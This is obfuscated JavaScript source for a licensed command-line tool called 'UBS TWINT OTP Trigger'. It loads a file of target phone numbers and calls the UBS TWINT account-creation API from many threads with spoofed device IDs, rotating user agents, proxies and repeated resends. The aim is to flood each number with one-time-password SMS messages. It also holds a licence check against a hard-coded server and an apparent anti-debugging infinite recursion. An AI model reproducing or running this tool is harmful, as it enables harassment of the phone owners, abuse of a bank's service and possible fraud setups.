    process.stdout.write("   [33m" + v55 + "[0m ");
    let v58 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn5 = v59 => {
      const v60 = v59.toString();
      if (v60.includes('\x0a') || v60.includes('\x0d')) {
        process.stdin.removeListener("data", fn5), v58 += v60.split(/[\r\n]/)[0x0];
        let v61 = v58.trim();
        if (v61.startsWith('\x22') && v61.endsWith('\x22')) v61 = v61.slice(0x1, -1);
        if (v61.startsWith('\x27') && v61.endsWith('\x27')) v61 = v61.slice(0x1, -1);
        v57(v61.trim() || v56);
      } else v58 += v60;
    };
    process.stdin.on("data", fn5);
  });
}
async function interactiveWizard() {
  let v62 = 0x1;
  let v63 = "numbers.txt";
  let v64 = "none",
    v65 = 0x14;
  let v66 = 0x0,
    v67 = 0xf;
  while (true) {
    process.stdout.write("[2J[H"), printHeader();
    if (v62 === 0x1) {
      const v68 = {};
      v68.name = "📁 Load from file (numbers.txt)", v68.value = "file";
      const v69 = {};
      v69.name = "❌ Exit Program", v69.value = "exit";
      const v70 = await selectOption("SELECT NUMBER SOURCE", [v68, v69]);
      if (v70 === "exit") process.exit(0x0);
      v62 = 0x2;
    } else {
      if (v62 === 0x2) {
        const v71 = {};
        v71.name = "✏️ Custom File Path", v71.value = "custom";
        const v72 = await selectOption("SELECT TARGET NUMBERS FILE", [v71, {
          'name': "⬅️ Go Back to Number Source",
          'value': "back"
        }]);
        if (v72 === "back") {
          v62 = 0x1;
          continue;
        }
        if (v72 === "custom") {
          const v73 = await promptText("Enter Numbers File Path:", "numbers.txt");
          if (v73.toLowerCase() === "back") continue;
          v63 = v73;
        } else v63 = v72;
        if (!fs.existsSync(v63)) try {
          fs.writeFileSync(v63, '');
        } catch (v74) {}
        v62 = 0x3;
      } else {
        if (v62 === 0x3) {
          const v75 = {};
          v75.name = "✏️ Custom File Path", v75.value = "custom";
          const v76 = await selectOption("SELECT PROXIES FILE", [v75, {
            'name': "🚫 None (Direct Connection)",
            'value': "none"
          }, {
            'name': "⬅️ Go Back to Numbers Selection",
            'value': "back"
          }]);
          if (v76 === "back") {
            v62 = 0x2;
            continue;
          }
          if (v76 === "custom") {
            const v77 = await promptText("Enter Proxies File Path:", "proxies.txt");
            if (v77.toLowerCase() === "back") continue;
            v64 = v77;
          } else v76 === "none" ? v64 = '' : v64 = v76;
          v62 = 0x4;
        } else {
          if (v62 === 0x4) {
            const v78 = {};
            v78.name = "20 Threads (Default)", v78.value = 0x14;
            const v79 = {};
            v79.name = "50 Threads (Fast)", v79.value = 0x32;
            const v80 = {};
            v80.name = "100 Threads (Extreme)", v80.value = 0x64;
            const v81 = {};
            v81.name = "⬅️ Go Back to Proxies Selection", v81.value = "back";
            const v82 = await selectOption("SELECT THREADS", [{
              'name': "10 Threads",
              'value': 0xa
            }, v78, v79, v80, {
              'name': "⌨️ Custom...",
              'value': "custom"
            }, v81]);
            if (v82 === "back") {
              v62 = 0x3;
              continue;
            }
            if (v82 === "custom") {
              const v83 = await promptText("Enter custom number of threads (type 'back' to go back):", '20');
              if (v83.toLowerCase() === "back") continue;
              v65 = parseInt(v83) || 0x14;
            } else v65 = v82;
            v62 = 0x5;
          } else {
            if (v62 === 0x5) {
              const v84 = {};
              v84.name = "🔁 Custom Resend Loop (Multiple resends per number)", v84.value = "resend_custom";
              const v85 = {};
              v85.name = "⬅️ Go Back to Threads Selection", v85.value = "back";
              const v86 = await selectOption("SELECT OTP DISPATCH / RESEND MODE", [v84, v85]);
              if (v86 === "back") {
                v62 = 0x4;
                continue;
              }
              if (v86 === "resend_1") {
                v66 = 0x1;
                const v87 = await promptText("Enter cooldown before Resend in seconds [default: 15]:", '15');
                if (v87.toLowerCase() === "back") continue;
                v67 = Math.max(0x1, parseInt(v87) || 0xf);
              } else {
                if (v86 === "resend_custom") {
                  const v88 = await promptText("How many Resends per number? [default: 2]:", '2');
                  if (v88.toLowerCase() === "back") continue;
                  v66 = Math.max(0x1, parseInt(v88) || 0x2);
                  const v89 = await promptText("Enter cooldown between Resends in seconds [default: 15]:", '15');
                  if (v89.toLowerCase() === "back") continue;
                  v67 = Math.max(0x1, parseInt(v89) || 0xf);
                } else v66 = 0x0, v67 = 0x0;
              }
              v62 = 0x6;
            } else {
              if (v62 === 0x6) break;
            }
          }
        }
      }
    }
  }
  if (process.stdin.isTTY) process.stdin.setRawMode(false);
  return {
    'numbersFile': v63,
    'proxiesFile': v64,
    'threads': String(v65),
    'resendCount': v66,
    'resendDelay': v67
  };
}
class Dashboard {
  constructor(v90) {
    {
      this.totalNumbers = v90;
      this.processed = 0x0;
      this.successful = 0x0;
      this.failed = 0x0;
      this.startTime = Date.now();
    }
  }
  ["addLog"](v91, v92) {
    let v93 = '';
    if (v92 === "success") v93 = B.bold(" ✦ NOT REXY") + DIM(" │ ") + B("OTP Sent") + DIM(" → ") + C.bold(v91.replace("Triggered OTP for ", ''));else {
      if (v92 === "retry") v93 = C.bold(" ↻ NOT REXY") + DIM(" │ ") + C(v91);else {
        const v94 = v91.match(/\+?\d{7,}/),
          v95 = v94 ? v94[0x0] : '',
          v96 = v91.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
        v93 = R.bold(" ✗ NOT REXY") + DIM(" │ ") + R(v95 ? '' + v95 : '') + DIM(v95 ? " → " : '') + G(v96);
      }
    }
    process.stdout.write("\r[K" + v93 + '\x0a'), this.render();
  }
  ["setStatus"](v97) {}
  ["update"]() {}
  ["render"]() {
    const v98 = this.processed / Math.max(this.totalNumbers, 0x1),
      v99 = (v98 * 0x64).toFixed(0x1);
    const v100 = Math.round(v98 * 0x14),
      v101 = 0x14 - v100,
      v102 = B('█'.repeat(v100)) + chalk.hex("#333333")('░'.repeat(v101));
    const v103 = '\x20\x20' + B.bold("NOT REXY") + DIM(" ⮞ ") + v102 + chalk.hex("#888888")('\x20' + v99 + '%') + DIM("  │  ") + B.bold('✓\x20' + this.successful) + DIM('\x20\x20') + R.bold('✗\x20' + this.failed) + DIM("  [" + this.processed + '/' + this.totalNumbers + ']');
    process.stdout.write("\r[K" + v103);
  }
  ["stop"]() {
    process.stdout.write("[2K\r\n");
    const v104 = Math.floor((Date.now() - this.startTime) / 0x3e8),
      v105 = Math.floor(v104 / 0x3c),
      v106 = v104 % 0x3c;
    const v107 = v105 + 'm\x20' + v106 + 's';
    console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  UBS TWINT OTP TRIGGER — COMPLETE          ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║'));
    console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v107.padEnd(0x6)) + "                       ") + C('║')), console.log(C("  ╚════════════════════════════════════════════╝\n"));
  }
}
function sendRequest(v108, v109, v110, v111, v112 = null, v113 = 0x61a8) {
  return new Promise((v114, v115) => {
    let v116;
    try {
      v116 = new URL(v108);
    } catch (v122) {
      return v115(new Error("Bad URL: " + v108));
    }
    const v117 = Object.assign({}, v110);
    if (v111) v117["Content-Length"] = Buffer.byteLength(v111);
    if (!v117["Accept-Encoding"]) v117["Accept-Encoding"] = "gzip, deflate";
    const v118 = {};
    v118.hostname = v116.hostname, v118.port = v116.port || (v116.protocol === "https:" ? 0x1bb : 0x50), v118.path = v116.pathname + v116.search, v118.method = v109, v118.headers = v117, v118.timeout = v113;
    const v119 = v118;
    if (v112) {
      const v123 = typeof v112 === "object" ? v112 : parseProxy(v112);
      v123 && !isNaN(v123.port) && v123.port > 0x0 && (v119.agent = createProxyAgent(v123));
    }
    const v120 = v116.protocol === "https:" ? https : http,
      v121 = v120.request(v119, v124 => {
        const v125 = [];
        v124.on("data", v126 => v125.push(v126)), v124.on("end", () => {
          let v127 = Buffer.concat(v125);
          const v128 = v124.headers["content-encoding"];
          if (v128 === "gzip") try {
            v127 = zlib.gunzipSync(v127);
          } catch (v129) {}
          if (v128 === "deflate") try {
            v127 = zlib.inflateSync(v127);
          } catch (v130) {}
          if (v128 === 'br') try {
            v127 = zlib.brotliDecompressSync(v127);
          } catch (v131) {}
          v114({
            'status': v124.statusCode,
            'headers': v124.headers,
            'data': v127.toString("utf8")
          });
        });
      });
    v121.on("error", v115), v121.on("timeout", () => {
      v121.destroy();
      v115(new Error("timeout"));
    });
    if (v111) v121.write(v111);
    v121.end();
  });
}
const ANDROID_VERSIONS = ["a12.0.0", "a13.0.0", "a14.0.0"],
  APP_VERSIONS = ["202.0.0.22561"],
  OKHTTP_VERSIONS = ["okhttp/4.9.3", "okhttp/4.10.0", "okhttp/4.11.0", "okhttp/4.12.0", "okhttp/5.0.0-alpha.14", "okhttp/5.3.0", "okhttp/5.3.1", "okhttp/5.3.2"];
function randomUA() {
  return OKHTTP_VERSIONS[Math.floor(Math.random() * OKHTTP_VERSIONS.length)];
}
function randomDevice() {
  return {
    'deviceId': crypto.randomBytes(0x8).toString("hex"),
    'deviceType': "GOG",
    'osVersion': ANDROID_VERSIONS[Math.floor(Math.random() * ANDROID_VERSIONS.length)],
    'appVersion': APP_VERSIONS[Math.floor(Math.random() * APP_VERSIONS.length)],
    'userAgent': randomUA()
  };
}
let activeDomain = "twint4.ubs.com";
async function fetchActiveDomain(v132 = null, v133 = 0x3a98) {
  try {
    const v134 = await sendRequest("https://twint.ubs.com/iizwlm", "GET", {
        'Accept': "application/json, */*;q=0.8",
        'User-Agent': randomUA(),
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip"
      }, null, v132, v133),
      v135 = JSON.parse(v134.data);
    if (v135 && v135.ACTIVEDOMAIN) activeDomain = v135.ACTIVEDOMAIN;
  } catch (v136) {}
}
async function createP2PAccount(v137, v138 = null, v139 = 0x61a8) {
  const v140 = randomDevice(),
    v141 = {};
  v141.appVersion = v140.appVersion;
  v141.deviceId = v140.deviceId, v141.deviceType = v140.deviceType, v141.language = 'en', v141.osVersion = v140.osVersion;
  v141.p2pAlias = v137, v141.touVersion = 0x11;
  const v142 = JSON.stringify(v141),
    v143 = "https://" + activeDomain + "/P2PPaymentSystem/P2PInterfacePublic/V100/P2PInterfacePublic/createP2PAccount";
  return sendRequest(v143, "POST", {
    'Accept-Language': "en-CH",
    'Content-Type': "application/json; charset=utf-8",
    'Host': activeDomain,
    'Connection': "Keep-Alive",
    'Accept-Encoding': "gzip",
    'User-Agent': v140.userAgent,
    'Accept': "application/json, */*;q=0.8"
  }, v142, v138, v139);
}
function normalizePhone(v144) {
  let v145 = v144.trim().replace(/[^0-9+]/g, '');
  if (!v145) return '';
  if (v145.startsWith('+')) return v145;
  if (v145.startsWith('00')) return '+' + v145.slice(0x2);
  if (v145.startsWith('0')) return "+41" + v145.slice(0x1);
  return '+' + v145;
}
async function main() {
  const v146 = generateHWID();
  let v147 = "Developer (Bypassed)";
  if (!BYPASS_LICENSE) {
    printHeader(), console.log(W("┌──────────────────────────────────────────────┐")), console.log(W("│ [•] Tool      : ") + B("UBS TWINT OTP Trigger        ") + W('│')), console.log(W("│ [•] Your HWID : ") + C(v146.padEnd(0x1d)) + W('│')), console.log(W("│ [•] Status    : ") + Y("Verifying License...         ") + W('│')), console.log(W("└──────────────────────────────────────────────┘\n"));
    const v162 = Date.now();
    let v163;
    try {
      v163 = await new Promise((v165, v166) => {
        const v167 = {};
        v167.hwid = v146, v167.app_id = "ubt", v167.version = "1.0.0";
        v167.timestamp = v162;
        const v168 = JSON.stringify(v167),
          v169 = http.request({
            'hostname': "188.137.176.163",
            'port': 0xec1,
            'path': "/api/verify",
            'method': "POST",
            'headers': {
              'Content-Type': "application/json",
              'Content-Length': Buffer.byteLength(v168)
            },
            'timeout': 0x2710
          }, v170 => {
            let v171 = '';
            v170.on("data", v172 => v171 += v172), v170.on("end", () => {
              try {
                v165(JSON.parse(v171));
              } catch (v173) {
                v166(new Error("bad_json"));
              }
            });
          });
        v169.on("error", v166), v169.on("timeout", function () {
          this.destroy();
          v166(new Error("Timeout"));
        }), v169.write(v168);
        v169.end();
      });
    } catch (v174) {
      console.error(R("\n  ✗ License server is currently unreachable. Please try again later.\n")), process.exit(0x1);
    }
    (!v163 || v163.status === "banned" || !v163.sig) && (console.error(R("\n  ✗ Unauthorized Hardware. Contact t.me/Rex_OTP_Tool\n")), process.exit(0x1));
    const v164 = v146 + '|' + "ubt" + '|' + "1.0.0" + '|' + v162;
    !verifyServerSignature(v164, v163.sig) && (console.error(R("\n  ✗ Signature verification failed.\n")), process.exit(0x1)), v147 = v163.user || "Licensed";
  }
  let v148 = process.argv.slice(0x2),
    v149 = "numbers.txt",
    v150 = "none",
    v151 = 0x14,
    v152 = 0x0,
    v153 = 0xf;
  if (v148.length === 0x0) {
    const v175 = await interactiveWizard();
    v149 = path.resolve(v175.numbersFile), v150 = v175.proxiesFile, v151 = parseInt(v175.threads) || 0x14, v152 = v175.resendCount || 0x0, v153 = v175.resendDelay || 0xf;
  } else {
    {
      v149 = path.resolve(v148[0x0]);
      v150 = v148[0x1] || "none";
      v151 = parseInt(v148[0x2]) || 0x14;
      v152 = parseInt(v148[0x3]) || 0x0;
      v153 = parseInt(v148[0x4]) || 0xf;
    }
  }
  printHeader(), console.log(B("  ✓ License: " + v147) + G(" | HWID: " + v146));
  !fs.existsSync(v149) && (console.error(R("\n✗ Error: Numbers file not found: " + v149 + '\x0a')), process.exit(0x1));
  let v154 = fs.readFileSync(v149, "utf8").split(/\r?\n/).map(v176 => v176.trim()).filter(v177 => v177.length > 0x4 && !v177.startsWith('#'));
  v154.length === 0x0 && (console.error(R("\n✗ Error: No numbers found in " + v149 + '\x0a')), process.exit(0x1));
  const v155 = v154.map(normalizePhone);
  let v156 = [];
  v150 && v150.toLowerCase() !== "none" && fs.existsSync(v150) && (v156 = fs.readFileSync(v150, "utf8").split(/\r?\n/).map(v178 => v178.trim()).filter(v179 => v179.length > 0x0 && !v179.startsWith('#')).map(parseProxy).filter(Boolean));
  console.log(C("✓ Loaded " + v155.length + " targets from " + path.basename(v149)));
  v156.length === 0x0 ? console.log(G("  No proxies configured (running direct)")) : console.log(G("  Proxies loaded: " + v156.length));
  console.log(C("✓ Threads : " + v151));
  v152 > 0x0 ? console.log(C("✓ Resend  : Enabled (" + v152 + "x per number, cooldown: " + v153 + "s)\n")) : console.log(C("✓ Resend  : Disabled (Single Send)\n"));
  fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(DEBUG_FILE, "=== UBT DEBUG SESSION " + new Date().toISOString() + " ===\n");
  const fn6 = () => {
    if (v156.length === 0x0) return null;
    const v180 = v156[Math.floor(Math.random() * v156.length)];
    return rotateSessionId(v180);
  };
  console.log(G("  Connecting to UBS TWINT active domain...")), await fetchActiveDomain(fn6(), 0x3a98), console.log(B("  ✓ Active Domain: " + activeDomain + '\x0a'));
  const v157 = new Dashboard(v155.length),
    v158 = setInterval(() => v157.render(), 0x1f4);
  function fn7(v181) {
    try {
      if (!fs.existsSync(v149)) return;
      const v182 = fs.readFileSync(v149, "utf8"),
        v183 = v181.replace(/[^0-9]/g, ''),
        v184 = v182.split(/\r?\n/).filter(v185 => {
          const v186 = v185.replace(/[^0-9]/g, '');
          return v186 && v186 !== v183;
        }).join('\x0a');
      fs.writeFileSync(v149, v184);
    } catch (v187) {}
  }
  async function fn8(v188, v189 = 0x0, v190 = 0xf) {
    const v191 = fn6();
    try {
      const v192 = await createP2PAccount(v188, v191, 0x61a8);
      let v193 = null;
      try {
        v193 = JSON.parse(v192.data);
      } catch (v200) {}
      const v194 = {};
      v194.status = v192.status, v194.data = v193 || v192.data, debugLog(v188, "api-res", v194);
      const v195 = v193 && v193.resultType ? String(v193.resultType).toLowerCase() : '',
        v196 = v193 && v193.status ? String(v193.status).toLowerCase() : '',
        v197 = v195 === 'ok' || v196 === 'ok' || v192.status === 0xc8 && !v195.includes("error") && v196 !== "invalid_input";
      if (!v197) {
        const v201 = v193 && (v193.message || v193.error || v193.status || v193.resultType) || "HTTP " + v192.status,
          v202 = {};
        return v202.success = false, v202.phone = v188, v202.message = v201, v202;
      }
      let v198 = 0x0;
      if (v189 > 0x0) for (let v203 = 0x1; v203 <= v189; v203++) {
        v157.addLog("Waiting " + v190 + "s cooldown before resend " + v203 + '/' + v189 + " for " + v188 + "...", "retry"), await new Promise(v204 => setTimeout(v204, v190 * 0x3e8));
        try {
          const v205 = fn6(),
            v206 = await createP2PAccount(v188, v205, 0x61a8);
          let v207 = null;
          try {
            v207 = JSON.parse(v206.data);
          } catch (v212) {}
          const v208 = {};
          v208.status = v206.status, v208.data = v207 || v206.data, debugLog(v188, "api-resend-" + v203, v208);
          const v209 = v207 && v207.resultType ? String(v207.resultType).toLowerCase() : '',
            v210 = v207 && v207.status ? String(v207.status).toLowerCase() : '',
            v211 = v209 === 'ok' || v210 === 'ok' || v206.status === 0xc8 && !v209.includes("error") && v210 !== "invalid_input";
          if (v211) v198++, v157.addLog("Resend " + v203 + '/' + v189 + " triggered for " + v188, "retry");else {
            const v213 = v207 && (v207.message || v207.error || v207.status || v207.resultType) || "HTTP " + v206.status;
            debugLog(v188, "api-resend-" + v203 + "-failed", v213);
          }
        } catch (v214) {
          debugLog(v188, "api-resend-" + v203 + "-err", v214.message);
        }
      }
      const v199 = {};
      return v199.success = true, v199.phone = v188, v199.message = "OTP Sent", v199.successfulResends = v198, v199;
    } catch (v215) {
      const v216 = {};
      return v216.success = false, v216.phone = v188, v216.message = v215.message, v216;
    }
  }
  const v159 = [...v155];
  const v160 = Math.min(v151, v159.length),
    v161 = [];
  async function fn9() {
    while (v159.length > 0x0) {
      const v217 = v159.shift();
      if (!v217) break;
      try {
        const v218 = await fn8(v217, v152, v153);
        if (v218.success) {
          v157.successful++, v157.processed++, fn7(v217);
          const v219 = v218.successfulResends ? "|RESENDS:" + v218.successfulResends : '';
          fs.appendFileSync(SUCCESSFUL_FILE, v218.phone + "|OTP_SENT" + v219 + '\x0a');
          const v220 = v218.successfulResends ? " (+" + v218.successfulResends + " Resend" + (v218.successfulResends > 0x1 ? 's' : '') + ')' : '';
          v157.addLog("Triggered OTP for " + v218.phone + v220, "success");
        } else v157.failed++, v157.processed++, fn7(v217), fs.appendFileSync(FAILED_FILE, v218.phone + '|' + v218.message + '\x0a'), v157.addLog("Failed on " + v218.phone + ':\x20' + v218.message, "error");
      } catch (v221) {
        v157.failed++, v157.processed++, v157.addLog("Fatal error on " + v217 + ':\x20' + v221.message, "error");
      }
    }
  }
  for (let v222 = 0x0; v222 < v160; v222++) v161.push(fn9());
  await Promise.all(v161), clearInterval(v158), v157.render(), v157.stop();
}
main().catch(v223 => {
  console.error(R("Fatal error: " + v223.message)), process.exit(0x1);
});
function fn2(v224) {
  function fn10(v225) {
    fn10(++v225);
  }
  try {
    if (v224) return fn10;else fn10(0x0);
  } catch (v226) {}
}